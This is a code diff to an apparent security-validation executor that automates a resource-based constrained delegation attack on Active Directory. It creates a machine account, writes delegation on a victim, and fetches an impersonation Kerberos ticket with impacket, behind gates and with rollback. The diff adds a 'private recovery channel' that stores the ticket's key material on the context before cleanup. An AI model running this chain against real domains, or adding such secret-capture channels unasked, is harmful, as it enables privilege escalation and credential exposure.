@@ -30,7 +30,8 @@ from typing import Any, Optional
 from ..recommend import (ParamSpec, ParamValue, values, delegation_computer,
                          recommended_spn, validate_sam_name, sam_name_warning)
 from .. import proof
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import key_material
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv, ToolAttempt, first_successful)
 
 
@@ -162,7 +163,18 @@ class RBCDExecutor(ValidationExecutor):
         return argv
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         self.cfg = ctx.config
         v = values(params)
         dc = ctx.config.dc_ip
@@ -202,7 +214,7 @@ class RBCDExecutor(ValidationExecutor):
 
         # 1) create the controlled computer (mutating, gated) ----------------
         if not gated("addcomputer", {"computer": f"{new}$"}):
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         add_argv = ["impacket-addcomputer", "-computer-name", f"{new}$",
                     "-computer-pass", new_pass, "-dc-ip", dc, *op_extra, op_target]
         res = ctx.runner.run(add_argv, timeout=ctx.config.tool_timeout_s)
@@ -210,14 +222,14 @@ class RBCDExecutor(ValidationExecutor):
         record("addcomputer", add_argv, res, add_ok)
         if not add_ok:
             errors.append("addcomputer_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         mutation["applied"] = True
 
         # 2) write RBCD on the victim (mutating, gated; D2 light fallback) ---
         # The GATE is called exactly as before, once, before either tool runs.
         if not gated("rbcd_write", {"delegate_to": f"{vsam}$", "delegate_from": f"{new}$"}):
             self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         rbcd_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$",
                      "-delegate-from", f"{new}$", "-action", "write",
                      "-dc-ip", dc, *op_extra, op_target]
@@ -234,7 +246,7 @@ class RBCDExecutor(ValidationExecutor):
         if not rbcd_ok:
             errors.append("rbcd_write_failed")
             self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         # 3) S4U getST as the new computer -> impersonation ticket -----------
         # #66146 gotcha: KRB5CCNAME must be UNSET before getST; it writes to CWD.
@@ -243,6 +255,7 @@ class RBCDExecutor(ValidationExecutor):
         res = ctx.runner.run(getst_argv, timeout=ctx.config.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
         ticket = self._parse_ticket(res.stdout or "", out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
         getst_ok = ticket is not None
         record("getST", getst_argv, res, getst_ok,
                 note="ticket saved" if getst_ok else "no ticket")
@@ -280,7 +293,7 @@ class RBCDExecutor(ValidationExecutor):
 
         # Complete = chain ran through the terminal step and rollback was tried.
         complete = getst_ok and mutation["rollback"]["performed"]
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- rollback
     def _rollback(self, ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record) -> None:
